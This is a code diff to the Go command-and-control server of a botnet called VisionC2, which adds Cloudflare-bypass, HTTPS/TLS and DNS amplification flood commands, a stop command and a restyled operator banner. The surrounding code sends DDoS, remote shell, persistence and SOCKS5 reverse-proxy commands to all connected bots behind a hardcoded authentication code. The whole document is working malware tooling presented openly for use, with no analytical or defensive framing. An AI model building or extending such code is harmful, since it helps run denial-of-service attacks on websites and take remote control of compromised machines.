@@ -7,7 +7,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"io"
 	"math/rand"
 	"net"
 	"os"
@@ -15,7 +14,6 @@ import (
 	"sync"
 	"time"
 )
-
 
 const (
 	// File paths
@@ -27,14 +25,13 @@ const (
 
 	//run setup.py dont try to change this yourself
 
-
 	// Server ports
 	BOT_SERVER_PORT  = "443" // do not change
-	USER_SERVER_PORT = "420"  
+	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "QdT2Kp1!2@FnB#v5"   
-	PROTOCOL_VERSION = "v1.0"    
+	MAGIC_CODE       = "E68dPGaHs*0iaYeS"
+	PROTOCOL_VERSION = "V5_4"
 )
 
 type BotConnection struct {
@@ -530,52 +527,56 @@ func (c *client) showHelpMenu(conn net.Conn) {
 
 func (c *client) writeHeader(conn net.Conn) {
 	conn.Write([]byte("\r\n"))
-	conn.Write([]byte("\033[1;97m╔════════════════════════════════��═════════════════════════════╗\r\n"))
-	conn.Write([]byte(fmt.Sprintf("\033[1;97m║                    \033[1;31mVisionC2 Help Menu [%s]\033[1;97m              ║\r\n", c.getLevelString())))
+	conn.Write([]byte("\033[1;97m╔══════════════════════════════════════════════════════════════╗\r\n"))
+	conn.Write([]byte(fmt.Sprintf("\033[1;97m║              \033[1;31mVisionC2 Help Menu [%s]\033[1;97m                    ║\r\n", c.getLevelString())))
 	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
 }
 
 func (c *client) writeGeneralCommands(conn net.Conn) {
 	commands := []string{
-		"║  \033[1;32mGeneral Commands\033[1;97m                                           ║",
-		"║    bots          - List all connected bots                   ║",
-		"║    clear/cls     - Clear screen                              ║",
-		"║    banner        - Show banner                               ║",
-		"║    help/?         - Show this help menu                       ║",
-		"║    ongoing       - Show ongoing attacks                      ║",
-		"║    logout/exit   - Disconnect from C2                        ║",
+		"║  \033[1;32mGeneral Commands\033[1;97m                        ║",
+		"║    bots           - List all connected bots                  ║",
+		"║    clear/cls      - Clear screen                             ║",
+		"║    banner         - Show banner                              ║",
+		"║    help/?         - Show this help menu                      ║",
+		"║    ongoing        - Show ongoing attacks                     ║",
+		"║    logout/exit    - Disconnect from C2                       ║",
 	}
 	c.writeSection(conn, commands)
 }
 
 func (c *client) writeAttackCommands(conn net.Conn) {
 	commands := []string{
-		"║  \033[1;31mAttack Commands\033[1;97m (sent to ALL bots)                      ║",
-		"║    !udpflood <ip> <port> <time>                              ║",
-		"║    !tcpflood <ip> <port> <time>                              ║",
-		"║    !http     <ip> <port> <time>                              ║",
-		"║    !syn      <ip> <port> <time>                              ║",
-		"║    !ack      <ip> <port> <time>                              ║",
-		"║    !gre      <ip> <port> <time>                              ║",
-		"║    ! dns      <ip> <port> <time>                              ║",
+		"║  \033[1;31mAttack Commands\033[1;97m (sent to ALL bots)                        ║",
+		"║    !udpflood  <ip/url> <port> <time>  - UDP flood            ║",
+		"║    !tcpflood  <ip/url> <port> <time>  - TCP flood            ║",
+		"║    !http      <ip/url> <port> <time>  - HTTP GET/POST flood  ║",
+		"║    !https     <ip/url> <port> <time>  - HTTPS/TLS flood      ║",
+		"║    !tls       <ip/url> <port> <time>  - TLS flood (alias)    ║",
+		"║    !cfbypass  <ip/url> <port> <time>  - Cloudflare bypass    ║",
+		"║    !syn       <ip/url> <port> <time>  - SYN flood            ║",
+		"║    !ack       <ip/url> <port> <time>  - ACK flood            ║",
+		"║    !gre       <ip/url> <port> <time>  - GRE flood            ║",
+		"║    !dns       <ip/url> <port> <time>  - DNS amplification    ║",
+		"║    !stop                              - Stop all attacks     ║",
 	}
 	c.writeSection(conn, commands)
 }
 
 func (c *client) writeShellCommands(conn net.Conn) {
 	commands := []string{
-		"║  \033[1;36mShell Commands\033[1;97m (sent to ALL bots)                       ║",
-		"║    !shell <command>  - Remote Scripting                      ║",
-		"║    !detach <command> - Run command in background             ║",
-		"║    !stream <command> - Real-time output streaming            ║",
+		"║  \033[1;36mShell Commands\033[1;97m (sent to ALL bots)       ║",
+		"║    !shell <command>   - Remote Scripting                     ║",
+		"║    !detach <command>  - Run command in background            ║",
+		"║    !stream <command>  - Real-time output streaming           ║",
 	}
 	c.writeSection(conn, commands)
 }
 
 func (c *client) writeBotTargeting(conn net.Conn) {
 	commands := []string{
-		"║  \033[1;33mBot Targeting\033[1;97m                                           ║",
-		"║    ! <botid> <cmd>    - Send command to specific bot          ║",
+		"║  \033[1;33mBot Targeting\033[1;97m                           ║",
+		"║    !<botid> <cmd>     - Send command to specific bot         ║",
 		"║    Example: !abc123 !shell whoami                            ║",
 	}
 	c.writeSection(conn, commands)
@@ -583,22 +584,22 @@ func (c *client) writeBotTargeting(conn net.Conn) {
 
 func (c *client) writeBotManagement(conn net.Conn) {
 	commands := []string{
-		"║  \033[1;34mBot Management\033[1;97m (sent to ALL bots)                       ║",
-		"║    ! reinstall        - Force reinstall bot                   ║",
-		"║    !lolnogtfo        - Kill/remove bot                       ║",
-		"║    !persist          - Setup persistence                     ║",
-		"║    !info             - Get bot info                          ║",
+		"║  \033[1;34mBot Management\033[1;97m (sent to ALL bots)       ║",
+		"║    !reinstall         - Force reinstall bot                  ║",
+		"║    !lolnogtfo         - Kill/remove bot                      ║",
+		"║    !persist           - Setup persistence                    ║",
+		"║    !info              - Get bot info                         ║",
 	}
 	c.writeSection(conn, commands)
 }
 
 func (c *client) writePrivateCommands(conn net.Conn) {
 	commands := []string{
-		"║  \033[1;35mPrivate Commands\033[1;97m (Owner only)                           ║",
-		"║    private           - Show private commands                  ║",
-		"║    db                - Show user database                     ║",
-		"║    !socks <port>     - Establish SOCKS5 reverse proxy        ║",
-		"║    !stopsocks        - Terminate proxy connections            ║",
+		"║  \033[1;35mPrivate Commands\033[1;97m (Owner only)                             ║",
+		"║    private            - Show private commands                ║",
+		"║    db                 - Show user database                   ║",
+		"║    !socks <port>      - Establish SOCKS5 reverse proxy       ║",
+		"║    !stopsocks         - Terminate proxy connections          ║",
 	}
 	c.writeSection(conn, commands)
 }
@@ -806,31 +807,54 @@ func getBotCount() int {
 
 // New Banner Art
 func showBanner(conn net.Conn) {
+	conn.Write([]byte("\033[2J\033[H")) // Clear screen
 	conn.Write([]byte("\r\n"))
+
+	// Gradient skull ASCII art with intricate design
+	conn.Write([]byte("\033[38;5;196m              ██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;197m              ██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;198m              ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;199m              ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;200m               ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;201m                ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝\033[0m\r\n"))
 	conn.Write([]byte("\r\n"))
-	conn.Write([]byte("\033[1;31m        ╔═══════════════════════════════════════════════╗    \033[0m \r\n"))
-	conn.Write([]byte("\033[1;31m        ║\033[1;97m- - - - - - \033[1;31mWelcome To VisioN\033[1;97Net V\033[1;97m3\033[1;97m - - - - - -\033[1;31m║   \033[0m \r\n"))
-	conn.Write([]byte("\033[1;31m        ║\033[1;97m- - - - - - \033[1;31mOnline And Ready To \033[1;97mNull\033[1;97m - - - - - -\033[1;31m║    \033[0m \r\n"))
-	conn.Write([]byte("\033[1;31m        ║\033[1;97m     - - - -\033[1;31m\033[1;31mType help for commands\033[1;97m!- - - -\033[1;31m║    \033[0m \r\n"))
-	conn.Write([]byte("\033[1;31m        ╚═══════════════════════════════════════════════╝   \033[0m \r\n"))
+
+	// Decorative eye design
+	conn.Write([]byte("\033[38;5;93m           ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;99m           ░░  \033[38;5;196m◄◄◄\033[38;5;99m ══════════════════════════════ \033[38;5;196m►►►\033[38;5;99m  ░░\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;105m           ░░  \033[38;5;231m☾\033[38;5;196m℣\033[38;5;231m☽\033[38;5;105m   \033[38;5;231mC O M M A N D   &   C O N T R O L\033[38;5;105m   ░░\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;111m           ░░  \033[38;5;196m◄◄◄\033[38;5;111m ══════════════════════════════ \033[38;5;196m►►►\033[38;5;111m  ░░\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;117m           ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m\r\n"))
 	conn.Write([]byte("\r\n"))
-	conn.Write([]byte("       Authenticated Bots: "))
-	conn.Write([]byte(fmt.Sprintf("%d", getBotCount())))
-	conn.Write([]byte("\n\r"))
-	conn.Write([]byte("  ───────────────────────────────────────\n\r"))
-	conn.Write([]byte("\033[38;5;46m"))
-	conn.Write([]byte("\033[0m"))
+
+	// Status box with gradient border
+	conn.Write([]byte("\033[38;5;61m     ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;62m     ┃\033[38;5;231m  ◈ Status: \033[38;5;46m● ONLINE\033[38;5;231m          ◈ Version: \033[38;5;214mv3.0\033[38;5;231m             \033[38;5;62m┃\033[0m\r\n"))
+	conn.Write([]byte(fmt.Sprintf("\033[38;5;63m     ┃\033[38;5;231m  ◈ Bots: \033[38;5;46m%-4d\033[38;5;231m               ◈ Protocol: \033[38;5;214m%s\033[38;5;231m           \033[38;5;63m┃\033[0m\r\n", getBotCount(), PROTOCOL_VERSION)))
+	conn.Write([]byte("\033[38;5;64m     ┃\033[38;5;231m  ◈ Mode: \033[38;5;196mAggressive\033[38;5;231m          ◈ Encryption: \033[38;5;46mTLS 1.3\033[38;5;231m       \033[38;5;64m┃\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;65m     ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;66m     ┃\033[38;5;245m        「 Type \033[38;5;231mhelp\033[38;5;245m for commands • \033[38;5;231mexit\033[38;5;245m to disconnect 」      \033[38;5;66m┃\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;67m     ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[0m\r\n"))
+	conn.Write([]byte("\r\n"))
+	conn.Write([]byte("\033[38;5;240m                    ─────── ☠ Ready To Strike ☠ ───────\033[0m\r\n"))
+	conn.Write([]byte("\r\n"))
 }
 
-func authUser(conn net.Conn) (bool, *client) {
+func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
 	for i := 0; i < 3; i++ {
 		conn.Write([]byte("\033[0m"))
 		conn.Write([]byte("\r\n\r\n\r\n\r\n\r\n\r\n\r\n"))
 		conn.Write([]byte("\r                        \033[38;5;109m► Auth\033[38;5;146ment\033[38;5;182micat\033[38;5;218mion -- \033[38;5;196mReq\033[38;5;161muir\033[38;5;89med\n"))
 		conn.Write([]byte("\033[0m\r                       ☉ Username\033[38;5;62m: "))
-		username, _ := getFromConn(conn)
+		username, err := getFromConnReader(reader)
+		if err != nil {
+			return false, nil
+		}
 		conn.Write([]byte("\033[0m\r                       ☉ Password\033[38;5;62m: \033[38;5;255m\033[48;5;255m"))
-		password, _ := getFromConn(conn)
+		password, err := getFromConnReader(reader)
+		if err != nil {
+			return false, nil
+		}
 		conn.Write([]byte("\033[0m"))
 		conn.Write([]byte("\033[2J\033[3J"))
 
@@ -850,7 +874,16 @@ func authUser(conn net.Conn) (bool, *client) {
 func getFromConn(conn net.Conn) (string, error) {
 	readString, err := bufio.NewReader(conn).ReadString('\n')
 	if err != nil {
-		println(err.Error())
+		return readString, err
+	}
+	readString = strings.TrimSuffix(readString, "\n")
+	readString = strings.TrimSuffix(readString, "\r")
+	return readString, nil
+}
+
+func getFromConnReader(reader *bufio.Reader) (string, error) {
+	readString, err := reader.ReadString('\n')
+	if err != nil {
 		return readString, err
 	}
 	readString = strings.TrimSuffix(readString, "\n")
@@ -922,29 +955,35 @@ func findBotByID(botID string) *BotConnection {
 }
 
 func handleRequest(conn net.Conn) {
+	defer conn.Close()
+
+	// Telnet negotiation for proper terminal handling
+	// IAC WILL ECHO, IAC WILL SGA (suppress go ahead), IAC WONT LINEMODE
+	conn.Write([]byte{255, 251, 1})  // IAC WILL ECHO
+	conn.Write([]byte{255, 251, 3})  // IAC WILL SGA
+	conn.Write([]byte{255, 252, 34}) // IAC WONT LINEMODE
+
 	conn.Write([]byte(getConsoleTitleAnsi("☾℣☽")))
-	readString, err := bufio.NewReader(conn).ReadString('\n')
+
+	// Use a single buffered reader for the entire connection
+	reader := bufio.NewReader(conn)
+
+	readString, err := reader.ReadString('\n')
 	if err != nil {
-		println(err.Error())
 		return
 	}
 
 	if strings.HasPrefix(readString, "spamtec") {
-		if authed, c := authUser(conn); authed {
+		if authed, c := authUser(conn, reader); authed {
 			showBanner(conn)
 			conn.Write([]byte(fmt.Sprintf("\033[0m\r  \033[38;5;15m\033[38;5;118m✅ Authentication Successful | Level: %s\n", c.getLevelString())))
 
 			for {
-				// FIXED: Use fmt.Fprintf instead of conn.Write with formatting
 				fmt.Fprintf(conn, "\n\r\033[38;5;146m[\033[38;5;161m%s\033[38;5;89m@\033[38;5;146m%s\033[38;5;146m]\033[38;5;82m► \033[0m", c.getLevelString(), c.user.Username)
 
-				readString, err := bufio.NewReader(conn).ReadString('\n')
+				readString, err := reader.ReadString('\n')
 				if err != nil {
-					if err == io.EOF {
-						return
-					}
-					fmt.Printf("Error reading input: %v\n", err)
-					conn.Close()
+					// Connection closed (EOF) or error - exit cleanly without logging
 					return
 				}
 				readString = strings.TrimSuffix(readString, "\r\n")
@@ -957,14 +996,14 @@ func handleRequest(conn net.Conn) {
 				command := parts[0]
 				switch strings.ToLower(command) {
 
-				case "!udpflood", "!tcpflood", "!http", "!syn", "!ack", "!gre":
+				case "!udpflood", "!tcpflood", "!http", "!https", "!tls", "!cfbypass", "!syn", "!ack", "!gre", "!dns":
 					if !c.canUseDDoS() {
 						conn.Write([]byte("\033[1;31m❌ Permission denied: DDoS commands require at least Basic level\r\n\033[0m"))
 						continue
 					}
 
 					if len(parts) < 4 {
-						conn.Write([]byte("Usage: method ip port duration\r\n"))
+						conn.Write([]byte("Usage: method ip/url port duration\r\n"))
 						continue
 					}
 
@@ -978,10 +1017,10 @@ func handleRequest(conn net.Conn) {
 						continue
 					}
 					conn.Write([]byte("\r\n"))
-					conn.Write([]byte(fmt.Sprintf("host: %s\r\n", ip)))
-					conn.Write([]byte(fmt.Sprintf("port: %s\r\n", port)))
-					conn.Write([]byte(fmt.Sprintf("length: %s\r\n", duration)))
-					conn.Write([]byte(fmt.Sprintf("method: %s\r\n", method)))
+					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Target:\033[0m %s\r\n", ip)))
+					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Port:\033[0m %s\r\n", port)))
+					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Duration:\033[0m %ss\r\n", duration)))
+					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Method:\033[0m %s\r\n", method)))
 					conn.Write([]byte("\r\n"))
 
 					ongoingAttacks[conn] = attack{
@@ -995,10 +1034,24 @@ func handleRequest(conn net.Conn) {
 					go func(conn net.Conn, attack attack) {
 						time.Sleep(attack.duration)
 						delete(ongoingAttacks, conn)
-						conn.Write([]byte("Attack has automatically finished and was removed.\n"))
+						conn.Write([]byte("\033[38;5;46m✓ Attack completed and removed.\033[0m\n"))
 					}(conn, ongoingAttacks[conn])
 
 					sendToBots(fmt.Sprintf("%s %s %s %s", method, ip, port, duration))
+
+				case "!stop":
+					if !c.canUseDDoS() {
+						conn.Write([]byte("\033[1;31m❌ Permission denied: DDoS commands require at least Basic level\r\n\033[0m"))
+						continue
+					}
+					// Clear all ongoing attacks
+					count := len(ongoingAttacks)
+					for k := range ongoingAttacks {
+						delete(ongoingAttacks, k)
+					}
+					// Send stop to all bots
+					sendToBots("!stop")
+					conn.Write([]byte(fmt.Sprintf("\033[38;5;46m✓ Stopped %d attack(s). Kill signal sent to all bots.\033[0m\r\n", count)))
 
 				case "ongoing":
 					if !c.canUseDDoS() {
